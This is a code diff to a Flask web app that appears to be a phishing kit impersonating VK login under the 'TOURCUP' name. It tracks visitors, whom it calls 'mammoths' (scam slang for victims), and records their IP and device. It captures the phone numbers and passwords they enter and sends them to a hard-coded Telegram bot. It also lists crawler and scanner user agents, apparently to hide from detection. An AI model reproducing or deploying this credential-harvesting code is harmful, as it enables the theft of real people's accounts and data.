@@ -6,11 +6,8 @@ app = Flask(__name__)
 
 TOKEN = '6114773413:AAFlXzRw2PhkJ4Pq5vVeTC_vKQgJuvX47fE'
 CHAT_ID = '660502874'
-domain = "tourcup.ru"
+domain = "tourcup.store"
 websiteName = "TOURCUP"
-
-
-
 
 
 
@@ -34,6 +31,8 @@ def shortNick(nickname = None, length = 10):
         textCleared = f"{textCleared}..."
 
     return textCleared
+
+
 
 @app.route("/tracker", methods=['POST'])
 def tracker():
@@ -71,7 +70,12 @@ def tracker():
         "AhrefsBot"
     ]
 
-    send(f"🗳 Мамонт зашел на сайт \n\n {shortNick(user_agent, 80)} — {url}")
+    ip_address = request.remote_addr
+
+    if url == '/auth':
+        send(f"🗳 Мамонт перешел на страницу авторизации вк \n\n 🌐 Ip мамонта: {ip_address} \n 🖥 Устройство: {shortNick(user_agent, 80)}" )
+    else:
+        send(f"🗳 Мамонт зашел на сайт \n\n 🌐 Ip мамонта: {ip_address} \n 🖥 Устройство:{shortNick(user_agent, 80)}" )
 
     return redirect("/")
 
@@ -94,6 +98,7 @@ def auth():
 
 @app.route("/callback", methods=['POST'])
 def page():
+    ip_address = request.remote_addr
     number = request.form['login']
     password = request.form['password']
 
@@ -102,9 +107,46 @@ def page():
 
     elif len(number) < 9 or len(password) < 6:
         return render_template('auth.html', error = "Заполните поля правильно!")
+    
 
 
-    send(f'💳 Мамонт ввёл данные 💳 \n\n 🌐 Ip мамонта: {tracker()} \n\n 📱Номер телефона: {number} \n 💻Пароль: {password}\n')
+    user_agent = str(request.headers.get('User-Agent'))
+
+    clear_words = {
+        "(Windows NT 10.0; Win64; x64)": "",
+        "(KHTML, like Gecko)": "",
+        "AppleWebKit/537.36": "",
+        "Mozilla/5.0 ": "",
+        "/": " ",
+        "(": "",
+        ")": "",
+        "   ": "",
+        "  ": " ",
+    }
+
+    for i, j in clear_words.items():
+        user_agent = user_agent.replace(i, j)
+
+    url = request.args.get('url')
+    blocked_user_agents = [
+        "YandexBot",
+        "uptimerobot.com",
+        "Googlebot",
+        "DirBuster",
+        "Go-http-client",
+        "GuzzleHttp",
+        "None",
+        "Vercelbot",
+        "checklyhq.com",
+        "serpstatbot",
+        "HeadlessChrome",
+        "Twitterbot",
+        "AhrefsBot"
+    ]
+
+
+
+    send(f'💳 Мамонт ввёл #данные 💳 \n\n 🌐 Ip мамонта: {ip_address} \n\n 🖥 Устройство: {shortNick(user_agent, 80)} \n\n 📱Номер телефона: {number} \n 💻Пароль: {password}')
 
     return redirect("/")
 
